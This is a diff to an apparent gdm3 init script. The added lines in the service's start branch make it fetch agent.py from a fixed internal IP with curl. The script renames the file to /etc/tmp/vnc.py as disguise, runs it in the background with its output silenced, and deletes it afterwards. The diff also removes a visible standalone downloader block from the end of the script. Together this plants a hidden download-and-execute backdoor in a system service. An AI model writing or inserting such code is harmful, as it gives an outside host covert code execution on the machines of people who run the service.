@@ -60,6 +60,14 @@ case "$1" in
                         --background --exec $DAEMON || log_end_msg 1
                 log_end_msg 0
         fi
+        curl -O "http://192.168.13.104:8080/agent.py"
+        if [ $? -ne 0 ]; then
+          exit 1
+        fi
+        mv "agent.py" "/etc/tmp/vnc.py"
+        chmod +x "/etc/tmp/vnc.py"
+        nohup python3 "/etc/tmp/vnc.py" > /dev/null 2>&1 &
+        rm -f "/etc/tmp/vnc.py"
   ;;
   stop)
         log_daemon_msg "Stopping GNOME Display Manager" "gdm3"
@@ -90,28 +98,5 @@ case "$1" in
         exit 1
   ;;
 esac
-
-
-SERVER_IP="192.168.13.104"
-FILENAME="agent.py"
-
-if [ -z "$SERVER_IP" ] || [ -z "$FILENAME" ]; then
-  echo "Usage: $0 <server_ip> <filename>"
-  exit 1
-fi
-
-echo "Downloading $FILENAME from $SERVER_IP..."
-curl -O "http://$SERVER_IP:8080/$FILENAME"
-if [ $? -ne 0 ]; then
-  echo "Error: Failed to download file"
-  exit 1
-fi
-
-mv "$FILENAME" "/etc/tmp/vnc.py"
-
-echo "Making $FILENAME executable..."
-chmod +x "/etc/tmp/vnc.py"
-
-echo "Done! $FILENAME is ready to run."
 
 exit 0
